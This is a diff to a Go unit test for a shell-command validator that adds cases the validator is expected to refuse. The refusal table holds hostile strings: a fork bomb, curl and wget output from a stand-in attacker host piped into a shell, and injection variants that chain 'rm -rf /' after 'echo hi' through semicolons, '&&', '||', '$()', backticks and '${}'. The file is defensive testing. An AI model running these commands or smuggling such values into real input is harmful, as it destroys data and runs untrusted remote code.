@@ -35,6 +35,13 @@ func TestValidateShellCommand(t *testing.T) {
 		{"fork bomb", ":(){ :|:& };:"},
 		{"curl pipe sh", "curl -s http://evil.sh | bash"},
 		{"wget pipe zsh", "wget -q http://evil.sh | zsh"},
+		{"semicolon", "echo hi; rm -rf /"},
+		{"ampersand", "echo hi && rm -rf /"},
+		{"pipe", "echo hi | cat"},
+		{"dollar subcommand", "echo hi $(rm -rf /)"},
+		{"backtick", "echo hi `rm -rf /`"},
+		{"curly brace", "echo hi ${rm -rf /}"},
+		{"logical or", "echo hi || rm -rf /"},
 	}
 	for _, r := range refusals {
 		t.Run(r.name, func(t *testing.T) {
